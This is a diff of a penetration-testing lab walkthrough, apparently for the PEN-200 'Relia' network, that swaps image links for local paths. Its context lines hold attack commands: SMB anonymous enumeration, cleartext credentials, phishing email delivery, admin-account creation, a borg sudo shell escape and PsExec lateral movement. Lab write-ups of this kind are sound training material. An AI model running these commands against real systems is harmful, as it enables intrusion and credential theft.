@@ -1,43 +1,43 @@
 ## Overview
-![image](https://hackmd.io/_uploads/Hy5_xnul-g.png)
+![image](_assets/Hy5_xnul-g.png)
 
 ## Nmap(外網)
 * `192.168.x.189`
-![image](https://hackmd.io/_uploads/ByrvLhuxbl.png)
-![image](https://hackmd.io/_uploads/B1wrDF2bWl.png)
+![image](_assets/ByrvLhuxbl.png)
+![image](_assets/B1wrDF2bWl.png)
 
 * `192.168.x.191`
-![image](https://hackmd.io/_uploads/Skvs83_gbx.png)
-![image](https://hackmd.io/_uploads/Hyd3d2_xZl.png)
-![image](https://hackmd.io/_uploads/HycUwKhWbl.png)
+![image](_assets/Skvs83_gbx.png)
+![image](_assets/Hyd3d2_xZl.png)
+![image](_assets/HycUwKhWbl.png)
 
 * `192.168.x.245`
-![image](https://hackmd.io/_uploads/SyITU2_xZg.png)
-![image](https://hackmd.io/_uploads/S1S5w3ugWx.png)
-![image](https://hackmd.io/_uploads/SyoD9nugZg.png)
+![image](_assets/SyITU2_xZg.png)
+![image](_assets/S1S5w3ugWx.png)
+![image](_assets/SyoD9nugZg.png)
 
 * `192.168.x.246`
-![image](https://hackmd.io/_uploads/HJiRL3dgbx.png)
-![image](https://hackmd.io/_uploads/BkuAwnuebe.png)
+![image](_assets/HJiRL3dgbx.png)
+![image](_assets/BkuAwnuebe.png)
 
 * `192.168.x.247`
-![image](https://hackmd.io/_uploads/HkzlDnOgZl.png)
-![image](https://hackmd.io/_uploads/Sk1l_hOlZx.png)
-![image](https://hackmd.io/_uploads/Sy1_Ptn-bg.png)
+![image](_assets/HkzlDnOgZl.png)
+![image](_assets/Sk1l_hOlZx.png)
+![image](_assets/Sy1_Ptn-bg.png)
 
 * `192.168.x.248`
-![image](https://hackmd.io/_uploads/r1Sbw3_xZl.png)
-![image](https://hackmd.io/_uploads/SJB-dhug-g.png)
-![image](https://hackmd.io/_uploads/BkktPF2b-x.png)
+![image](_assets/r1Sbw3_xZl.png)
+![image](_assets/SJB-dhug-g.png)
+![image](_assets/BkktPF2b-x.png)
 
 * `192.168.x.249`
-![image](https://hackmd.io/_uploads/BkjGPhuxbe.png)
-![image](https://hackmd.io/_uploads/SyPGu3dlWx.png)
-![image](https://hackmd.io/_uploads/r1ecwYnZZx.png)
+![image](_assets/BkjGPhuxbe.png)
+![image](_assets/SyPGu3dlWx.png)
+![image](_assets/r1ecwYnZZx.png)
 
 ## SMB匿名登入
 `while IFS= read -r host; do echo $host;smbclient -N -L //$host/;echo "\n" ;done < outerHosts.txt`
-![image](https://hackmd.io/_uploads/BJZQ2JMb-e.png)
+![image](_assets/BJZQ2JMb-e.png)
 
 ## 192.168.x.189
 
@@ -66,104 +66,104 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 
 ## 192.168.x.245
 之前看過這類型的漏洞，確認245的Apache版本確實是有漏洞的
-![image](https://hackmd.io/_uploads/HyGaT3dlZe.png)
-![image](https://hackmd.io/_uploads/Sygr02ue-g.png)
+![image](_assets/HyGaT3dlZe.png)
+![image](_assets/Sygr02ue-g.png)
 
 * `Path Traversal`
 沒找到id_rsa檔案，但嘗試其他加密種類確實有找到私鑰
-![image](https://hackmd.io/_uploads/rJEaTod--g.png)
-![image](https://hackmd.io/_uploads/BJNvRjuWZg.png)
+![image](_assets/rJEaTod--g.png)
+![image](_assets/BJNvRjuWZg.png)
 
 * `ssh login`
-![image](https://hackmd.io/_uploads/rJ-a13_bWg.png)
-![image](https://hackmd.io/_uploads/ByKJlh_-bl.png)
+![image](_assets/rJ-a13_bWg.png)
+![image](_assets/ByKJlh_-bl.png)
 
 * `Privilege escalation`
-![image](https://hackmd.io/_uploads/BkX_DQobWl.png)
-![image](https://hackmd.io/_uploads/BJGZOQiWWx.png)
-![image](https://hackmd.io/_uploads/BJLfomjZbg.png)
+![image](_assets/BkX_DQobWl.png)
+![image](_assets/BJGZOQiWWx.png)
+![image](_assets/BJLfomjZbg.png)
 
 ## 192.168.x.246
-![image](https://hackmd.io/_uploads/BJLBOabzZl.png)
-![image](https://hackmd.io/_uploads/B1Ye9p-zbl.png)
+![image](_assets/BJLBOabzZl.png)
+![image](_assets/B1Ye9p-zbl.png)
 
 * `ssh`
-![image](https://hackmd.io/_uploads/BJgr6I4zbx.png)
+![image](_assets/BJgr6I4zbx.png)
 
 * `Privilege escalation`
     1. `sudo version`
-    ![image](https://hackmd.io/_uploads/BJT73AZzWl.png)
-    ![image](https://hackmd.io/_uploads/SyGPh0WGZx.png)
-    ![image](https://hackmd.io/_uploads/rk2e6RZGbe.png)
+    ![image](_assets/BJT73AZzWl.png)
+    ![image](_assets/SyGPh0WGZx.png)
+    ![image](_assets/rk2e6RZGbe.png)
 
     2. `System config`
-    ![image](https://hackmd.io/_uploads/r17zMv4zWg.png)
-    ![image](https://hackmd.io/_uploads/r1mHfPNzWe.png)
-    ![image](https://hackmd.io/_uploads/ry6a6vNGZx.png)
+    ![image](_assets/r17zMv4zWg.png)
+    ![image](_assets/r1mHfPNzWe.png)
+    ![image](_assets/ry6a6vNGZx.png)
 
     3. `sus port`
-    ![image](https://hackmd.io/_uploads/Hygon8ONM-x.png)
-    ![image](https://hackmd.io/_uploads/SJyUBOEfWg.png)
-    ![image](https://hackmd.io/_uploads/Hkz1ROVfbg.png)
-    ![image](https://hackmd.io/_uploads/rJIfAuVM-x.png)
+    ![image](_assets/Hygon8ONM-x.png)
+    ![image](_assets/SJyUBOEfWg.png)
+    ![image](_assets/Hkz1ROVfbg.png)
+    ![image](_assets/rJIfAuVM-x.png)
 
 * `8000 port`
-![image](https://hackmd.io/_uploads/SJUTet4G-g.png)
-![image](https://hackmd.io/_uploads/HJXIbF4GZx.png)
-![image](https://hackmd.io/_uploads/BypVMKNf-x.png)
-![image](https://hackmd.io/_uploads/BJqlEt4zWe.png)
+![image](_assets/SJUTet4G-g.png)
+![image](_assets/HJXIbF4GZx.png)
+![image](_assets/BypVMKNf-x.png)
+![image](_assets/BJqlEt4zWe.png)
 
     1. `Writable Directory for Anita`
-    ![image](https://hackmd.io/_uploads/Ske58nBGZx.png)
-    ![image](https://hackmd.io/_uploads/S10oLhSGbl.png)
-    ![image](https://hackmd.io/_uploads/HkrlunBM-e.png)
+    ![image](_assets/Ske58nBGZx.png)
+    ![image](_assets/S10oLhSGbl.png)
+    ![image](_assets/HkrlunBM-e.png)
 
 * `Privilege escalation(Again)`
-![image](https://hackmd.io/_uploads/SkOLinBM-x.png)
-![image](https://hackmd.io/_uploads/ByC_o2SG-x.png)
+![image](_assets/SkOLinBM-x.png)
+![image](_assets/ByC_o2SG-x.png)
 
 ## 192.168.x.247
 * 80 Port
-![image](https://hackmd.io/_uploads/rywvuKhbbg.png)
-![image](https://hackmd.io/_uploads/rJVO_FnbZx.png)
-![image](https://hackmd.io/_uploads/ryCqOF3bWe.png)
-![image](https://hackmd.io/_uploads/Bknj_F3b-x.png)
-![image](https://hackmd.io/_uploads/r1g-YKnWbe.png)
-![image](https://hackmd.io/_uploads/SkzIW52Zbx.png)
+![image](_assets/rywvuKhbbg.png)
+![image](_assets/rJVO_FnbZx.png)
+![image](_assets/ryCqOF3bWe.png)
+![image](_assets/Bknj_F3b-x.png)
+![image](_assets/r1g-YKnWbe.png)
+![image](_assets/SkzIW52Zbx.png)
 
 * 14020 Port
-![image](https://hackmd.io/_uploads/SkGtc53--x.png)
-![image](https://hackmd.io/_uploads/H1krpc2WZx.png)
-![image](https://hackmd.io/_uploads/SJdv092-We.png)
-![image](https://hackmd.io/_uploads/rk7UC93-We.png)
-![image](https://hackmd.io/_uploads/HJijA92ZZg.png)
+![image](_assets/SkGtc53--x.png)
+![image](_assets/H1krpc2WZx.png)
+![image](_assets/SJdv092-We.png)
+![image](_assets/rk7UC93-We.png)
+![image](_assets/HJijA92ZZg.png)
 
 * 14080
-![image](https://hackmd.io/_uploads/BkIpsf1Gbg.png)
-![image](https://hackmd.io/_uploads/BkmiFz1Mbg.png)
-![image](https://hackmd.io/_uploads/HkfJhMyG-e.png)
-![image](https://hackmd.io/_uploads/rkwl3Mkfbg.png)
-![image](https://hackmd.io/_uploads/rJOqpGyzWe.png)
+![image](_assets/BkIpsf1Gbg.png)
+![image](_assets/BkmiFz1Mbg.png)
+![image](_assets/HkfJhMyG-e.png)
+![image](_assets/rkwl3Mkfbg.png)
+![image](_assets/rJOqpGyzWe.png)
 
     * file upload(Failed)
-    ![image](https://hackmd.io/_uploads/HJnab7Jf-l.png)
-    ![image](https://hackmd.io/_uploads/HJ1KBQJGZx.png)
-    ![image](https://hackmd.io/_uploads/H13lUQkfbl.png)
+    ![image](_assets/HJnab7Jf-l.png)
+    ![image](_assets/HJ1KBQJGZx.png)
+    ![image](_assets/H13lUQkfbl.png)
     
     * Version
-    ![image](https://hackmd.io/_uploads/SkjKXV1GWe.png)
-    ![image](https://hackmd.io/_uploads/Byo67VyGZx.png)
-    ![image](https://hackmd.io/_uploads/rJCnV41zWe.png)
+    ![image](_assets/SkjKXV1GWe.png)
+    ![image](_assets/Byo67VyGZx.png)
+    ![image](_assets/rJCnV41zWe.png)
 
     * RCE
-    ![image](https://hackmd.io/_uploads/r1_HP4Jz-g.png)
-    ![image](https://hackmd.io/_uploads/S1f4DEkM-e.png)
-    ![image](https://hackmd.io/_uploads/r1GuuE1MZg.png)
+    ![image](_assets/r1_HP4Jz-g.png)
+    ![image](_assets/S1f4DEkM-e.png)
+    ![image](_assets/r1GuuE1MZg.png)
 
 * Privilege escalation
-![image](https://hackmd.io/_uploads/ryI6d4yGbl.png)
-![image](https://hackmd.io/_uploads/ryjtjNJzWx.png)
-![image](https://hackmd.io/_uploads/HyxooE1zbg.png)
+![image](_assets/ryI6d4yGbl.png)
+![image](_assets/ryjtjNJzWx.png)
+![image](_assets/HyxooE1zbg.png)
 
 ## 192.168.x.248
 
@@ -183,83 +183,83 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
     welcome1
     ```
 
-    ![image](https://hackmd.io/_uploads/HJcWElGW-x.png)
-    ![image](https://hackmd.io/_uploads/B15oUlfWZe.png)
-    ![image](https://hackmd.io/_uploads/Sy2Rtefbbl.png)
-    ![image](https://hackmd.io/_uploads/H1N93xMWWe.png)
+    ![image](_assets/HJcWElGW-x.png)
+    ![image](_assets/B15oUlfWZe.png)
+    ![image](_assets/Sy2Rtefbbl.png)
+    ![image](_assets/H1N93xMWWe.png)
     2. wwwroot
     `dnnuser`&`DotNetNukeDatabasePassword!`
-    ![image](https://hackmd.io/_uploads/r1eqK-GZbg.png)
-    ![image](https://hackmd.io/_uploads/HkPnYWzbWx.png)
+    ![image](_assets/r1eqK-GZbg.png)
+    ![image](_assets/HkPnYWzbWx.png)
 
 2. 灑密碼
     * `smb`
-    ![image](https://hackmd.io/_uploads/rkABRgzZbx.png)
+    ![image](_assets/rkABRgzZbx.png)
 
     * `ssh`
-    ![image](https://hackmd.io/_uploads/H17k1WfZWx.png)
+    ![image](_assets/H17k1WfZWx.png)
 
     * `ftp`
-    ![image](https://hackmd.io/_uploads/rympJWGWbg.png)
+    ![image](_assets/rympJWGWbg.png)
 
     * `winrm`
-    ![image](https://hackmd.io/_uploads/By_fgWfbbg.png)
+    ![image](_assets/By_fgWfbbg.png)
 
     * `rdp`
-    ![image](https://hackmd.io/_uploads/HJuZJrjWWg.png)
+    ![image](_assets/HJuZJrjWWg.png)
 
 3. rdp
 `xfreerdp3 /u:emma /p:SomersetVinyl1! /v:192.168.220.248 /dynamic-resolution`
 系統內的C槽有一個不尋常的資料夾，打開裡面的內容發現有一個log檔，裡面的內容顯示缺少`BetaLibrary.Dll`且看起來是每一分鐘定期執行，直接執行後可以得知程式的執行者是`mark`
-![image](https://hackmd.io/_uploads/rkxJVSo-bl.png)
-![image](https://hackmd.io/_uploads/Skz07SobWg.png)
-![image](https://hackmd.io/_uploads/By3x4Hibbl.png)
-![image](https://hackmd.io/_uploads/B11mESiZbg.png)
-![image](https://hackmd.io/_uploads/rJASM_h-Wx.png)
-![image](https://hackmd.io/_uploads/Hk-Pz_hWWg.png)
+![image](_assets/rkxJVSo-bl.png)
+![image](_assets/Skz07SobWg.png)
+![image](_assets/By3x4Hibbl.png)
+![image](_assets/B11mESiZbg.png)
+![image](_assets/rJASM_h-Wx.png)
+![image](_assets/Hk-Pz_hWWg.png)
 
 4. Privilege escalation
 `xfreerdp3 /u:mark /p:"\!8@aBRBYdb3\!" /v:192.168.185.248 /dynamic-resolution`
 用Powerup找到能夠寫入的環境變數的路徑，但log顯示還是無法找到dll，嘗試直接呼叫dll的名字能夠正常被找到，推測是只能放在跟程式相同的資料夾
 而在環境變數裡還能找到一個`Appkey`，用這組密碼跟電腦內的其他使用者組合成功確認為mark的密碼
-![image](https://hackmd.io/_uploads/rJa7xLiZWx.png)
-![image](https://hackmd.io/_uploads/SkWlZt3Wbx.png)
-![image](https://hackmd.io/_uploads/S1Guet3Zbe.png)
+![image](_assets/rJa7xLiZWx.png)
+![image](_assets/SkWlZt3Wbx.png)
+![image](_assets/S1Guet3Zbe.png)
 
 5. Password spray
-![image](https://hackmd.io/_uploads/Hy8krKnb-g.png)
-![image](https://hackmd.io/_uploads/SJL8rFhWZl.png)
-![image](https://hackmd.io/_uploads/HJWdrK3-be.png)
+![image](_assets/Hy8krKnb-g.png)
+![image](_assets/SJL8rFhWZl.png)
+![image](_assets/HJWdrK3-be.png)
 
 ## 192.168.x.249
 * `8000 port`
-![image](https://hackmd.io/_uploads/Hyo-XTrG-g.png)
-![image](https://hackmd.io/_uploads/HkeLC-OmZg.png)
-![image](https://hackmd.io/_uploads/SyTeXarfZx.png)
+![image](_assets/Hyo-XTrG-g.png)
+![image](_assets/HkeLC-OmZg.png)
+![image](_assets/SyTeXarfZx.png)
     1. `Default Password`
     `admin` & `admin`
-    ![image](https://hackmd.io/_uploads/S1EgaTHGZx.png)
+    ![image](_assets/S1EgaTHGZx.png)
     
     2. `Exploit`
-    ![image](https://hackmd.io/_uploads/HJvQyASzZx.png)
-    ![image](https://hackmd.io/_uploads/SJmZJ0Hzbl.png)
-    ![image](https://hackmd.io/_uploads/HJXbZASMbe.png)
-    ![image](https://hackmd.io/_uploads/rks6xRBMbl.png)
-    ![image](https://hackmd.io/_uploads/BkTAxRSfWe.png)
+    ![image](_assets/HJvQyASzZx.png)
+    ![image](_assets/SJmZJ0Hzbl.png)
+    ![image](_assets/HJXbZASMbe.png)
+    ![image](_assets/rks6xRBMbl.png)
+    ![image](_assets/BkTAxRSfWe.png)
     
     3. `RCE`
-    ![image](https://hackmd.io/_uploads/H1VNVASMZe.png)
-    ![image](https://hackmd.io/_uploads/HkhBN0SzWg.png)
+    ![image](_assets/H1VNVASMZe.png)
+    ![image](_assets/HkhBN0SzWg.png)
 
 * `Privilege Escalation`
-![image](https://hackmd.io/_uploads/S1HQ4CSfZe.png)
-![image](https://hackmd.io/_uploads/HJa_H0Bfbe.png)
-![image](https://hackmd.io/_uploads/HJuhlQ_mWl.png)
-![image](https://hackmd.io/_uploads/rJZ0x7Om-l.png)
+![image](_assets/S1HQ4CSfZe.png)
+![image](_assets/HJa_H0Bfbe.png)
+![image](_assets/HJuhlQ_mWl.png)
+![image](_assets/rJZ0x7Om-l.png)
 
 * `credentials dumps`
 `maildmz@relia.com:DPuBT9tGCBrTbR`&`jim@relia.com`
-![image](https://hackmd.io/_uploads/HJ5iI4_7Wl.png)
+![image](_assets/HJ5iI4_7Wl.png)
 
 ## Nmap(內網)
 * 172.16.x.7
@@ -506,8 +506,8 @@ Nmap done: 7 IP addresses (7 hosts up) scanned in 202.71 seconds
 
 ## 172.16.x.7
 * 80 port
-![image](https://hackmd.io/_uploads/rJGbxO8SZl.png)
-![image](https://hackmd.io/_uploads/rk_ExOUH-l.png)
+![image](_assets/rJGbxO8SZl.png)
+![image](_assets/rk_ExOUH-l.png)
     * wpscan
     ```
     [+] WordPress version 6.0.3 identified (Insecure, released on 2022-10-17).
@@ -547,11 +547,11 @@ Nmap done: 7 IP addresses (7 hosts up) scanned in 202.71 seconds
      |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
      |  Login Error Messages (Aggressive Detection)
     ```
-    ![image](https://hackmd.io/_uploads/ryoxnMFHbl.png)
+    ![image](_assets/ryoxnMFHbl.png)
 
     * wplogin
     `http://intranet.relia.com/wordpress/wp-login.php`
-    ![image](https://hackmd.io/_uploads/r12ISdLrZx.png)
+    ![image](_assets/r12ISdLrZx.png)
     
 * AS-REP
 `xfreerdp3 /u:michelle /p:NotMyPassword0k\? /v:172.16.x.7 /d:relia.com /dynamic-resolution`
@@ -574,15 +574,15 @@ The command completed successfully.
 * Privilege escalation
 `net user dave2 password123$ /add`
 `net localgroup administrators dave2 /add`
-![image](https://hackmd.io/_uploads/BkweQHKSWe.png)
-![image](https://hackmd.io/_uploads/B19nmSYrWx.png)
-![image](https://hackmd.io/_uploads/r1-1EHKHbe.png)
-![image](https://hackmd.io/_uploads/rJwx4SYBWx.png)
-![image](https://hackmd.io/_uploads/r14MEHFBbl.png)
-![image](https://hackmd.io/_uploads/S1Q1SHYr-x.png)
+![image](_assets/BkweQHKSWe.png)
+![image](_assets/B19nmSYrWx.png)
+![image](_assets/r1-1EHKHbe.png)
+![image](_assets/rJwx4SYBWx.png)
+![image](_assets/r14MEHFBbl.png)
+![image](_assets/S1Q1SHYr-x.png)
 
 * Cred search
-![image](https://hackmd.io/_uploads/ByscLHKSbe.png)
+![image](_assets/ByscLHKSbe.png)
 ```
 ┌──(kali㉿kali)-[~/Desktop/Pen200/Relia]
 └─$ nxc rdp 172.16.158.0/24 -u andrea -p PasswordPassword_6 
@@ -606,8 +606,8 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 * mail
 `swaks --from maildmz@relia.com --to jim@relia.com --server 192.168.111.189 --auth LOGIN --auth-user maildmz@relia.com --header "88" --body "hello" --attach @config.Library-ms`
 `DPuBT9tGCBrTbR`
-![image](https://hackmd.io/_uploads/HyJnl3cEZg.png)
-![image](https://hackmd.io/_uploads/B1Xgbn5Vbe.png)
+![image](_assets/HyJnl3cEZg.png)
+![image](_assets/B1Xgbn5Vbe.png)
 ```powershell
 PS C:\Users\jim\Documents> ipconfig /all
 ipconfig /all
@@ -641,7 +641,7 @@ using password found 172.16.x.21 smb share
 
 * Cred search
     1. `Castello1!`
-    ![image](https://hackmd.io/_uploads/B17pX4TVZx.png)
+    ![image](_assets/B17pX4TVZx.png)
     
     2. `kdbx`
     ```
@@ -693,7 +693,7 @@ using password found 172.16.x.21 smb share
     Use the "--show" option to display all of the cracked passwords reliably
     Session completed. 
     ```
-    ![image](https://hackmd.io/_uploads/By4MoHaVbx.png)
+    ![image](_assets/By4MoHaVbx.png)
 
     * AS-REP Roasting
     ```
@@ -766,29 +766,29 @@ using password found 172.16.x.21 smb share
 
 * Privilege escalation
     * system os exploit(need visual studio)
-    ![image](https://hackmd.io/_uploads/BypFJIYBZe.png)
-    ![image](https://hackmd.io/_uploads/ryx3y8Kr-g.png)
-    ![image](https://hackmd.io/_uploads/By-3W8KBWe.png)
+    ![image](_assets/BypFJIYBZe.png)
+    ![image](_assets/ryx3y8Kr-g.png)
+    ![image](_assets/By-3W8KBWe.png)
 
     * writeble file
-    ![image](https://hackmd.io/_uploads/HyTlzLtrbl.png)
-    ![image](https://hackmd.io/_uploads/BkKHGIKrZx.png)
-    ![image](https://hackmd.io/_uploads/r1B5-8KBZx.png)
-    ![image](https://hackmd.io/_uploads/ry817UYS-e.png)
+    ![image](_assets/HyTlzLtrbl.png)
+    ![image](_assets/BkKHGIKrZx.png)
+    ![image](_assets/r1B5-8KBZx.png)
+    ![image](_assets/ry817UYS-e.png)
 
 * cred search
     1. hash
-    ![image](https://hackmd.io/_uploads/Hk8rQIKBWl.png)
-    ![image](https://hackmd.io/_uploads/BJmUP89SZx.png)
+    ![image](_assets/Hk8rQIKBWl.png)
+    ![image](_assets/BJmUP89SZx.png)
 
     2. kbdx
     ```
     sarah    placeholder
     ```
-    ![image](https://hackmd.io/_uploads/SyBbHLKH-e.png)
-    ![image](https://hackmd.io/_uploads/SJtzB8YHWx.png)
-    ![image](https://hackmd.io/_uploads/B1pnH8trbe.png)
-    ![image](https://hackmd.io/_uploads/ry6MDUtHZe.png)
+    ![image](_assets/SyBbHLKH-e.png)
+    ![image](_assets/SJtzB8YHWx.png)
+    ![image](_assets/B1pnH8trbe.png)
+    ![image](_assets/ry6MDUtHZe.png)
 
 ## 172.16.x.19
 `ssh sarah@172.16.x.19 -i innerSSH.PRIV`
@@ -827,7 +827,7 @@ using password found 172.16.x.21 smb share
 	sarah ALL=(ALL) NOPASSWD:/usr/bin/borg extract *
 	sarah ALL=(ALL) NOPASSWD:/usr/bin/borg mount *
     ```
-    ![image](https://hackmd.io/_uploads/ry0SdvAHWe.png)
+    ![image](_assets/ry0SdvAHWe.png)
     ```bash
     sarah@backup:~$ sudo borg extract @:/::: --rsh "/bin/bash -c '/bin/bash </dev/tty >/dev/tty 2>/dev/tty'"
     root@backup:/home/sarah# 
@@ -925,7 +925,7 @@ using password found 172.16.x.21 smb share
 
 * Privilege escalation
     1. Doas
-	![image](https://hackmd.io/_uploads/rySzBR4Lbe.png)
+	![image](_assets/rySzBR4Lbe.png)
 	```
 	╔══════════╣ Doas Configuration
 	╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#doas                                                                                            
@@ -990,7 +990,7 @@ using password found 172.16.x.21 smb share
 	/var/tmp/vi.recover
     ```
     `http://172.16.142.20/phpMyAdmin/tmp/rev.php`
-    ![image](https://hackmd.io/_uploads/rkVx0xSUbx.png)
+    ![image](_assets/rkVx0xSUbx.png)
 
 * cred search
 ```
@@ -1229,7 +1229,7 @@ Running nxc against 256 targets ━━━━━━━━━━━━━━━━
 
 * 172.16.x.21
 `.\PsExec64.exe -i \\FILES -u relia\Administrator -p vau!XCKjNQBv2$ cmd`
-![image](https://hackmd.io/_uploads/B1ZSWsPIZe.png)
+![image](_assets/B1ZSWsPIZe.png)
 
 * 172.16.x.30
 `.\PsExec64.exe -i \\WEBBY -u relia\Administrator -p vau!XCKjNQBv2$ powershell`
